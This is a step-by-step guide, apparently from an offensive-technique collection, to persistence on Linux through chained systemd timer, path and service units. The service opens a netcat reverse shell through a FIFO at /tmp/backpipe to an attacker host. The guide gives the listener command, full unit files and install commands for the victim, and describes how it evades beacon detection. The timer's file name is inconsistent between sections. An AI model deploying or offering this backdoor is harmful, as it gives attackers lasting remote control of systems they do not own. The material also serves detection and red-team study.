# Proxy Execution

## Description

This sequence of commands sets up a scheduled task, much like the better-known `cron` jobs, to execute
a reverse shell using a FIFO pipe located at `/tmp/backpipe` indirectly via a path-based unit.

The service file (`revshell.service`) uses:

* The `Environment` directive to set up the remote host and port to connect to
* The `ExecStartPre` directive to check fo the FIFO pipe and create it if it does not exist
* The `ExecStart` directive to execute the backdoor sequence (more info on how it works located in the linked blog below)

The path file (`execshell.path`) uses:

* The `PathExists` directive to monitor a path that should always exist - `/etc/passwd`
* The `Unit` directive to identify the unit file to execute when the path directive has been validated

The timer file (`execshell.timer`) uses:

* The `AccuracySec` directive to align service execution with the wider system
* The `OnCalendar` directive to execute the specified unit at the start of every minute
* The `Unit` directive to identify the unit file to execute when the timer is triggered
* The `RandomizedDelaySec` to avoid simple beacon detections
* The `Persistent` directive to reactivate this timer immediately if it missed previous activations

## Additional Notes

* The path `/etc/passwd` was chosen here because we can assume it will reliably exist on all Linux systems
* This is a modified version of the [ScheduledReverseShell](../ScheduledReverseShell) example;
  it is only meant to provide a way to avoid simple detections, much like how
  proxying binary execution through `rundll32.exe` works on Windows.
* Stopping all components reveals the dependency order between them:

  ```sh
  $ systemctl --user stop revshell.service
  Warning: Stopping revshell.service, but it can still be activated by:
    execshell.path
  $ systemctl --user stop execshell.path
  Warning: Stopping execshell.path, but it can still be activated by:
    execpath.timer
  $ systemctl --user stop execpath.timer
  $
  ```

## Step by Step

1. Stand up listener on attacker server

```sh
nc -nlvp 4444
```

2. Generate a service file to create the backdoor on the victim

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Service]
; only consider this service up if the ExecStart directive succeeds
; (just to show some variety when compared to ScheduledReverseShell's revshell.service)
Type=exec
; https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
Environment=RHOST="10.10.10.10" RPORT="4444"
ExecStartPre=/bin/sh -c "find /tmp/backpipe || mknod --mode=0666 /tmp/backpipe p"
ExecStart=/bin/sh -c "/bin/sh 0</tmp/backpipe | /bin/nc ${RHOST} ${RPORT} 1>/tmp/backpipe"
```

3. Generate a path file to execute the backdoor on the victim

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.path.html
[Path]
PathExists=/etc/passwd
Unit=revshell.service
```

4. Generate a timer file to execute the path unit at regular intervals (every minute in our case)

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.timer.html
[Timer]
AccuracySec=1s
OnCalendar=*-*-* *:*:00
Unit=execshell.path
RandomizedDelaySec=4s
Persistent=true
```

4. Install into the systemd user folder on the victim

```sh
mkdir -p ~/.config/systemd/user/
ln -s `pwd`/execpath.timer ~/.config/systemd/user/
ln -s `pwd`/execshell.path ~/.config/systemd/user/
ln -s `pwd`/revshell.service ~/.config/systemd/user/
```

5. Start the scheduled task

```sh
systemctl --user start execshell.timer
```

6. Wait for the shell!

```sh
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [${attacker}] from (UNKNOWN) [${victim}]
```
